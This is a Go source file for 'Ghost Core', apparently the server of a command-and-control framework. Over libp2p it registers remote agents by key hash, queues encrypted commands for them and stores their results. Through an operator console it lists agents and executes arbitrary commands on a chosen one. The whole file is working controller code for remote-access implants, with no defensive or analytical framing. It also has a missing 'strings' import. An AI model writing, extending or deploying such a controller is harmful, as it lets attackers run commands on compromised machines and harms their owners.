package main

import (
    "context"
    "crypto/rand"
    "encoding/hex"
    "flag"
    "fmt"
    "log"
    "os"
    "os/signal"
    "sync"
    "syscall"
    "time"

    "ghost-relay/internal/crypto"
    "ghost-relay/internal/libp2p"
    "ghost-relay/internal/protobuf"
    "ghost-relay/internal/storage"

    "github.com/libp2p/go-libp2p/core/host"
    "github.com/libp2p/go-libp2p/core/network"
    "github.com/libp2p/go-libp2p/core/peer"
    "google.golang.org/protobuf/proto"
)

var (
    listenPort = flag.Int("port", 4001, "libp2p listen port")
    keyHex     = flag.String("key", "", "32-byte hex encryption key")
    dbPath     = flag.String("db", "./ghost.db", "bolt database path")
)

type Core struct {
    host    host.Host
    crypto  *crypto.Crypto
    db      *storage.DB
    agents  map[peer.ID]string
    mu      sync.RWMutex
    ctx     context.Context
    cancel  context.CancelFunc
}

func main() {
    flag.Parse()
    if *keyHex == "" {
        log.Fatal("encryption key required (-key)")
    }
    crypt, err := crypto.NewCrypto(*keyHex)
    if err != nil {
        log.Fatal(err)
    }
    db, err := storage.New(*dbPath)
    if err != nil {
        log.Fatal(err)
    }
    defer db.Close()

    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    h, _, err := libp2p.NewHost(ctx, *listenPort, nil)
    if err != nil {
        log.Fatal(err)
    }
    core := &Core{
        host:    h,
        crypto:  crypt,
        db:      db,
        agents:  make(map[peer.ID]string),
        ctx:     ctx,
        cancel:  cancel,
    }

    h.SetStreamHandler("/ghost/agent/1.0.0", core.handleAgentStream)
    h.SetStreamHandler("/ghost/console/1.0.0", core.handleConsoleStream)

    log.Printf("Ghost Core running, peer ID: %s", h.ID())
    sigCh := make(chan os.Signal, 1)
    signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
    <-sigCh
    core.shutdown()
}


func generateRandomNonce() ([]byte, error) {
    nonce := make([]byte, 12)
    _, err := rand.Read(nonce)
    return nonce, err
}

func (c *Core) handleAgentStream(s network.Stream) {
    defer s.Close()
    peerID := s.Conn().RemotePeer()
    log.Printf("Agent connected: %s", peerID)

    
    buf := make([]byte, 32)
    n, err := s.Read(buf)
    if err != nil || n != 32 {
        log.Printf("Agent %s: handshake failed", peerID)
        return
    }
    expected := c.crypto.KeyHash()
    for i := 0; i < 32; i++ {
        if buf[i] != expected[i] {
            log.Printf("Agent %s: invalid key", peerID)
            return
        }
    }
    s.Write([]byte("OK"))

    c.mu.Lock()
    c.agents[peerID] = fmt.Sprintf("agent-%d", time.Now().Unix())
    c.mu.Unlock()
    c.db.SaveAgent(peerID.String(), time.Now())

    
    for {
        cmd, err := c.db.PopCommand(peerID.String())
        if err != nil || cmd == "" {
            time.Sleep(1 * time.Second)
            continue
        }
        
        nonce, err := generateRandomNonce()
        if err != nil {
            log.Printf("nonce generation failed: %v", err)
            continue
        }
        encCmd, err := c.crypto.Encrypt([]byte(cmd), nonce)
        if err != nil {
            log.Printf("encryption failed: %v", err)
            continue
        }
        envelope := &protobuf.Envelope{
            EncryptedPayload: encCmd,
            Nonce:            nonce,
        }
        data, _ := proto.Marshal(envelope)
        s.Write(data)

        
        s.SetReadDeadline(time.Now().Add(30 * time.Second))
        respBuf := make([]byte, 4096)
        n, err := s.Read(respBuf)
        s.SetReadDeadline(time.Time{})
        if err != nil {
            log.Printf("agent %s read error: %v", peerID, err)
            
            c.mu.Lock()
            delete(c.agents, peerID)
            c.mu.Unlock()
            break
        }
        var resEnv protobuf.Envelope
        if err := proto.Unmarshal(respBuf[:n], &resEnv); err != nil {
            log.Printf("unmarshal error: %v", err)
            continue
        }
        decRes, err := c.crypto.Decrypt(resEnv.EncryptedPayload, resEnv.Nonce)
        if err != nil {
            log.Printf("decryption error: %v", err)
            continue
        }
        c.db.SaveResult(peerID.String(), string(decRes))
    }
    c.mu.Lock()
    delete(c.agents, peerID)
    c.mu.Unlock()
}

func (c *Core) handleConsoleStream(s network.Stream) {
    defer s.Close()
    peerID := s.Conn().RemotePeer()
    log.Printf("Console connected: %s", peerID)

    
    buf := make([]byte, 32)
    s.Read(buf)
    if !c.crypto.VerifyKeyHash(buf) {
        log.Printf("Console %s: auth failed", peerID)
        return
    }
    s.Write([]byte("OK"))

    for {
        reqBuf := make([]byte, 4096)
        n, err := s.Read(reqBuf)
        if err != nil {
            break
        }
        var req protobuf.Command
        if err := proto.Unmarshal(reqBuf[:n], &req); err != nil {
            continue
        }

        switch req.Type {
        case "list":
            c.mu.RLock()
            var agents []string
            for pid, sid := range c.agents {
                agents = append(agents, fmt.Sprintf("%s (%s)", pid, sid))
            }
            c.mu.RUnlock()
            listStr := ""
            for _, a := range agents {
                listStr += a + "\n"
            }
            res := &protobuf.Result{CommandId: req.Id, Output: listStr, Success: true}
            data, _ := proto.Marshal(res)
            s.Write(data)

        case "exec":
          
            parts := strings.SplitN(req.Args, ":", 2)
            if len(parts) != 2 {
                res := &protobuf.Result{CommandId: req.Id, Output: "invalid format: agent-id:command", Success: false}
                data, _ := proto.Marshal(res)
                s.Write(data)
                continue
            }
            agentName := parts[0]
            command := parts[1]

            var targetPeer peer.ID
            c.mu.RLock()
            for pid, sid := range c.agents {
                if sid == agentName || pid.String() == agentName {
                    targetPeer = pid
                    break
                }
            }
            c.mu.RUnlock()
            if targetPeer == "" {
                res := &protobuf.Result{CommandId: req.Id, Output: "agent not found", Success: false}
                data, _ := proto.Marshal(res)
                s.Write(data)
                continue
            }
            c.db.QueueCommand(targetPeer.String(), command)
            
            var result string
            for i := 0; i < 30; i++ {
                result, _ = c.db.PopResult(targetPeer.String())
                if result != "" {
                    break
                }
                time.Sleep(200 * time.Millisecond)
            }
            if result == "" {
                result = "timeout"
            }
            res := &protobuf.Result{CommandId: req.Id, Output: result, Success: true}
            data, _ := proto.Marshal(res)
            s.Write(data)

        case "ping":
            res := &protobuf.Result{CommandId: req.Id, Output: "pong", Success: true}
            data, _ := proto.Marshal(res)
            s.Write(data)
        }
    }
}

func (c *Core) shutdown() {
    log.Println("Shutting down core...")
    c.cancel()
    c.host.Close()
}
